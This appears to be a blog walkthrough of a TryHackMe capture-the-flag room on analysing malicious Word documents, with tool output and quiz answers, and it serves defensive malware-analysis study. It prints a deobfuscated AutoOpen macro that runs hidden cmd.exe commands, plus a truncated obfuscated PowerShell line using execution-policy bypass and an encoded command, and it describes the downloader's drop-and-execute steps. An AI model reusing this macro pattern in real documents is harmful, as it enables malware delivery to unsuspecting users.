<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="THM: Squid Game" />
<meta property="og:locale" content="en" />
<meta name="description" content="Walkthrough" />
<meta property="og:description" content="Walkthrough" />
<link rel="canonical" href="http://localhost:4000/posts/ctf-blueteam-squid-game" />
<meta property="og:url" content="http://localhost:4000/posts/ctf-blueteam-squid-game" />
<meta property="og:site_name" content="Diogo Lages" />
<meta property="og:image" content="http://localhost:4000/assets/img/thumbnails/ctf-blueteam-squid-game.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-01-03T00:00:00+00:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/img/thumbnails/ctf-blueteam-squid-game.png" />
<meta property="twitter:title" content="THM: Squid Game" />
<meta name="twitter:site" content="@Diogo-Lages" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-01-03T00:00:00+00:00","datePublished":"2025-01-03T00:00:00+00:00","description":"Walkthrough","headline":"THM: Squid Game","image":"http://localhost:4000/assets/img/thumbnails/ctf-blueteam-squid-game.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/ctf-blueteam-squid-game"},"url":"http://localhost:4000/posts/ctf-blueteam-squid-game"}</script>
<!-- End Jekyll SEO tag -->


  <title>THM: Squid Game | Diogo Lages
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Diogo Lages">
<meta name="application-name" content="Diogo Lages">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/whoami.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">Diogo Lages</a>
    <p class="site-subtitle fst-italic mb-0">You can't keep it a secret, because you're a good man</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
      

      
        <a
          href="https://github.com/Diogo-Lages"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://www.linkedin.com/in/diogo-lages/"
          aria-label="linkedin"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-linkedin"></i>
        </a>
      
    
      

      
        <a
          href="https://tryhackme.com/p/DiogoLages"
          aria-label="link"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fas fa-user-secret"></i>
        </a>
      
    
      

      
        <a
          href="https://osintframework.com/"
          aria-label="link"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fas fa-fingerprint"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>THM: Squid Game</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  




<!-- return -->










<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>THM: Squid Game</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1735862400"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Jan  3, 2025
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/thumbnails/ctf-blueteam-squid-game.png" class="popup img-link preview-img shimmer"><img src="/assets/img/thumbnails/ctf-blueteam-squid-game.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://twitter.com/diogo-lages">Diogo Lages</a>
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="3107 words"
>
  <em>17 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">THM: Squid Game</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">THM: Squid Game</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  

  <div class="content">
    <h3 id="walkthrough"><span class="me-2"><strong>Walkthrough</strong></span><a href="#walkthrough" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="ctf-platform-tryhackme"><span class="me-2"><strong>CTF Platform</strong>: TryHackMe</span><a href="#ctf-platform-tryhackme" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<h4 id="level-hard"><span class="me-2"><strong>Level</strong>: Hard</span><a href="#level-hard" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<h4 id="tools-used"><span class="me-2"><strong>Tools Used</strong>:</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<ul>
  <li>olemeta</li>
  <li>oletimes</li>
  <li>oleid</li>
  <li>oledump.py</li>
  <li>vipermonkey</li>
</ul>

<h4 id="resources-used"><span class="me-2"><strong>Resources Used:</strong>:</span><a href="#resources-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<ul>
  <li>Squid Game: <a href="https://tryhackme.com/room/squidgameroom">TryHackMe</a></li>
</ul>

<h2 id="steps-for-the-ctf"><span class="me-2"><strong>Steps for the CTF</strong></span><a href="#steps-for-the-ctf" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<hr />

<h3 id="attacker-1"><span class="me-2"><strong>Attacker 1</strong></span><a href="#attacker-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="document-metadata-analysis"><span class="me-2"><strong>Document Metadata Analysis</strong></span><a href="#document-metadata-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>We start by analyzing the metadata of the malicious document (<code class="language-plaintext highlighter-rouge">attacker1.doc</code>) using <code class="language-plaintext highlighter-rouge">olemeta</code> and <code class="language-plaintext highlighter-rouge">oletimes</code>. This provides valuable information such as the document title, author, and timestamps that can assist in attribution and threat hunting. However, keep in mind that metadata can be spoofed, so it should not be taken at face value.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>parrot@parrot:~<span class="nv">$ </span>olemeta attacker1.doc
FILE: attacker1.doc
Properties from the SummaryInformation stream:
+---------------------+------------------------------+
|Property             |Value                         |
+---------------------+------------------------------+
|codepage             |1251                          |
|title                |Networked multi-state         |
|                     |projection                    |
|subject              |West Virginia  Samanta        |
...snip...
</pre></td></tr></tbody></table></code></div></div>

<p><strong>Observations:</strong></p>
<ul>
  <li><strong>Q6:</strong> Find the phone number in the maldoc. <em>(Answer based on metadata extraction.)</em></li>
  <li><strong>Q8:</strong> Provide the subject for this maldoc: <code class="language-plaintext highlighter-rouge">West Virginia Samanta</code>.</li>
  <li><strong>Q9:</strong> Provide the time when this document was last saved. <em>(Cross-reference between <code class="language-plaintext highlighter-rouge">olemeta</code> and <code class="language-plaintext highlighter-rouge">oletimes</code> outputs. Note the 30-second discrepancy.)</em></li>
</ul>

<hr />

<h4 id="macros-analysis"><span class="me-2"><strong>Macros Analysis</strong></span><a href="#macros-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>Next, we confirm the presence of macros and assess their potential maliciousness using <code class="language-plaintext highlighter-rouge">oleid</code>. The tool identifies suspicious keywords and confirms the presence of VBA macros.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>parrot@parrot:~<span class="nv">$ </span>oleid attacker1.doc 
Filename: attacker1.doc
...snip...
<span class="nt">--------------------</span>+--------------------+----------+--------------------------
VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA    
                    |                    |          |macros. Suspicious        
                    |                    |          |keywords were found. Use  
                    |                    |          |olevba and mraptor <span class="k">for</span>    
                    |                    |          |more info.                
<span class="nt">--------------------</span>+--------------------+----------+--------------------------
...snip...
</pre></td></tr></tbody></table></code></div></div>

<p>To locate the macros within the document, we use <code class="language-plaintext highlighter-rouge">oledump.py</code>, which identifies streams containing macros (marked with an “M”).</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>parrot@parrot:~<span class="nv">$ </span>oledump.py attacker1.doc 
...snip...
  7:        41 <span class="s1">'Macros/PROJECTwm'</span>
  8: M    9852 <span class="s1">'Macros/VBA/ThisDocument'</span>
  9:      5460 <span class="s1">'Macros/VBA/_VBA_PROJECT'</span>
...snip...
</pre></td></tr></tbody></table></code></div></div>

<p><strong>Observations:</strong></p>
<ul>
  <li><strong>Q7:</strong> Doing some static analysis, provide the type of maldoc this is under the keyword “AutoOpen”: <code class="language-plaintext highlighter-rouge">AutoExec</code>.</li>
  <li><strong>Q10:</strong> Provide the stream number that contains a macro: <code class="language-plaintext highlighter-rouge">8</code>.</li>
  <li><strong>Q11:</strong> Provide the name of the stream that contains a macro: <code class="language-plaintext highlighter-rouge">Macros/VBA/ThisDocument</code>.</li>
</ul>

<hr />

<h4 id="deobfuscation-using-vipermonkey"><span class="me-2"><strong>Deobfuscation Using ViperMonkey</strong></span><a href="#deobfuscation-using-vipermonkey" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>The extracted macro code is heavily obfuscated. To simplify analysis, we use <code class="language-plaintext highlighter-rouge">vipermonkey</code> to emulate the macro’s execution and deobfuscate its logic.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>parrot@parrot:~<span class="nv">$ </span>vmonkey <span class="nt">-s</span> attacker1.doc
</pre></td></tr></tbody></table></code></div></div>

<p>After deobfuscation, the macro’s core functionality becomes clearer:</p>

<div class="language-vb highlighter-rouge"><div class="code-header">
        <span data-label-text="Visual Basic"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="k">Sub</span> <span class="nf">AutoOpen</span><span class="p">()</span>
<span class="k">On</span> <span class="k">Error</span> <span class="k">Resume</span> <span class="k">Next</span>
  <span class="k">Set</span> <span class="n">shapeHandle</span> <span class="o">=</span> <span class="n">Shapes</span><span class="p">(</span><span class="s">"h9mkae7"</span><span class="p">)</span>
  <span class="n">VBA</span><span class="p">.</span><span class="n">Shell</span><span class="p">#</span> <span class="s">"CmD /C "</span> <span class="n">Replace</span><span class="p">(</span><span class="n">shapeHandle</span><span class="p">.</span><span class="n">AlternativeText</span> <span class="o">+</span> <span class="s">""</span><span class="p">,</span> <span class="s">"["</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span> <span class="p">,</span> <span class="mi">0</span>
<span class="k">End</span> <span class="k">Sub</span>
</pre></td></tr></tbody></table></code></div></div>

<p><strong>Explanation:</strong><br />
The macro retrieves the <code class="language-plaintext highlighter-rouge">AlternativeText</code> property of a Shape object named “h9mkae7” and replaces all instances of “[” with “A”. The resulting string is passed to <code class="language-plaintext highlighter-rouge">cmd.exe</code> via <code class="language-plaintext highlighter-rouge">VBA.Shell</code>.</p>

<p>Using <code class="language-plaintext highlighter-rouge">oledump.py</code> with an ad-hoc YARA rule, we extract the command stored in the Shape object’s alt text:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>parrot@parrot:~<span class="nv">$ </span>oledump.py <span class="nt">-y</span> <span class="s2">"#s#h9mkae7"</span> attacker1_2.doc 
  1:       114 <span class="s1">'\x01CompObj'</span>
  2:      4096 <span class="s1">'\x05DocumentSummaryInformation'</span>
  3:      4096 <span class="s1">'\x05SummaryInformation'</span>
  4:     13859 <span class="s1">'1Table'</span>
               YARA rule: string
...snip...
</pre></td></tr></tbody></table></code></div></div>

<p>Extracting strings from stream 4 reveals the encoded PowerShell command:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>parrot@parrot:~<span class="nv">$ </span>oledump.py <span class="nt">-s</span> 4 <span class="nt">-S</span> attacker1_2.doc
h9mkae7
P^O^W^E^R^S^H^E^L^L ^-^N^o^P^r^o^f^i^l^e^ -^E^x^e^cutionPolicy B^^^yp^ass <span class="nt">-encodedcommand</span> J[Bp[G4[cwB0[GE[bgBj[GU[I[[9[C[[WwBT[Hk[cwB0[GU[bQ[u[...
...snip...
</pre></td></tr></tbody></table></code></div></div>

<hr />

<h4 id="code-analysis"><span class="me-2"><strong>Code Analysis</strong></span><a href="#code-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>The decoded PowerShell script performs the following actions:</p>

<ol>
  <li>
    <p><strong>WebClient Creation:</strong><br />
Creates an instance of <code class="language-plaintext highlighter-rouge">WebClient</code> to make HTTP requests.</p>
  </li>
  <li>
    <p><strong>C2 Communication:</strong><br />
Downloads additional payloads from attacker-controlled domains and IPs.</p>
  </li>
  <li>
    <p><strong>Executable Dropping:</strong><br />
Saves a downloaded executable to <code class="language-plaintext highlighter-rouge">C:\ProgramData\QdZGP.exe</code>.</p>
  </li>
  <li>
    <p><strong>Execution via COM Object:</strong><br />
Executes the dropped executable using the <code class="language-plaintext highlighter-rouge">ShellBrowserWindow</code> COM object.</p>
  </li>
</ol>

<p><strong>Observations:</strong></p>
<ul>
  <li><strong>Q1:</strong> What is the malicious C2 domain you found in the maldoc where an executable download was attempted? <em>(Answer based on analysis.)</em></li>
  <li><strong>Q2:</strong> What executable file is the maldoc trying to drop? <code class="language-plaintext highlighter-rouge">QdZGP.exe</code>.</li>
  <li><strong>Q3:</strong> In what folder is it dropping the malicious executable? <code class="language-plaintext highlighter-rouge">C:\ProgramData</code>.</li>
  <li><strong>Q4:</strong> Provide the name of the COM object the maldoc is trying to access. <code class="language-plaintext highlighter-rouge">ShellBrowserWindow</code>.</li>
  <li><strong>Q5:</strong> Include the malicious IP and the PHP extension found in the maldoc. <em>(Answer based on analysis.)</em></li>
</ul>

<hr />

<h3 id="attacker-2"><span class="me-2"><strong>Attacker 2</strong></span><a href="#attacker-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="identifying-macros"><span class="me-2"><strong>Identifying Macros</strong></span><a href="#identifying-macros" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>We begin by analyzing the malicious document (<code class="language-plaintext highlighter-rouge">attacker2.doc</code>) using <code class="language-plaintext highlighter-rouge">oleid</code>, <code class="language-plaintext highlighter-rouge">olevba</code>, and <code class="language-plaintext highlighter-rouge">oledump</code>. These tools help us identify and assess the macros embedded within the document.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>parrot@parrot:~<span class="nv">$ </span>oleid attacker2.doc
...snip...
Filename: attacker2.doc
<span class="nt">--------------------</span>+--------------------+----------+--------------------------
Indicator           |Value               |Risk      |Description               
<span class="nt">--------------------</span>+--------------------+----------+--------------------------
...snip...
VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA    
                    |                    |          |macros. Suspicious        
                    |                    |          |keywords were found. Use  
                    |                    |          |olevba and mraptor <span class="k">for</span>    
                    |                    |          |more info.                
<span class="nt">--------------------</span>+--------------------+----------+--------------------------
</pre></td></tr></tbody></table></code></div></div>

<p>Using <code class="language-plaintext highlighter-rouge">olevba</code>, we extract additional details about the potentially malicious activities performed by the macros:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre>parrot@parrot:~<span class="nv">$ </span>olevba attacker2.doc
...snip...
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |UserForm_Click      |Runs when the file is opened and ActiveX     
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file <span class="o">(</span><span class="k">if </span>combined with Open<span class="o">)</span>  |
|Suspicious|Print <span class="c">#             |May write to a file (if combined with Open)  |</span>
|Suspicious|Binary              |May <span class="nb">read </span>or write a binary file <span class="o">(</span><span class="k">if </span>combined |
|          |                    |with Open<span class="o">)</span>                                   |
|Suspicious|Shell               |May run an executable file or a system       
|          |                    |command                                      |
|Suspicious|wscript.shell       |May run an executable file or a system       
|          |                    |command                                      |
...snip...
</pre></td></tr></tbody></table></code></div></div>

<p>To locate the streams containing macros, we use <code class="language-plaintext highlighter-rouge">oledump.py</code>:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>parrot@parrot:~<span class="nv">$ </span>oledump.py attacker2.doc 
...snip...
  9:      2220 <span class="s1">'Macros/Form/o'</span>
 10:       566 <span class="s1">'Macros/PROJECT'</span>
 11:        92 <span class="s1">'Macros/PROJECTwm'</span>
 12: M    6655 <span class="s1">'Macros/VBA/Form'</span>
 13: M   15671 <span class="s1">'Macros/VBA/Module1'</span>
 14: M    1593 <span class="s1">'Macros/VBA/ThisDocument'</span>
 15:     42465 <span class="s1">'Macros/VBA/_VBA_PROJECT'</span>
 16: M    2724 <span class="s1">'Macros/VBA/bxh'</span>
...snip...
</pre></td></tr></tbody></table></code></div></div>

<p><strong>Observations:</strong></p>
<ul>
  <li><strong>Q1:</strong> Provide the streams (numbers) that contain macros: <code class="language-plaintext highlighter-rouge">12, 13, 14, 16</code>.</li>
  <li><strong>Q2:</strong> Provide the size (bytes) of the compiled code for the second stream that contains a macro: <code class="language-plaintext highlighter-rouge">15671</code>.</li>
  <li><strong>Q3:</strong> Provide the largest number of bytes found while analyzing the streams: <code class="language-plaintext highlighter-rouge">42465</code>.</li>
  <li><strong>Q12:</strong> Under what stream did the main malicious script use to retrieve DLLs from the C2 domains? (Provide the name of the stream): <code class="language-plaintext highlighter-rouge">Macros/Form/o</code>.</li>
</ul>

<hr />

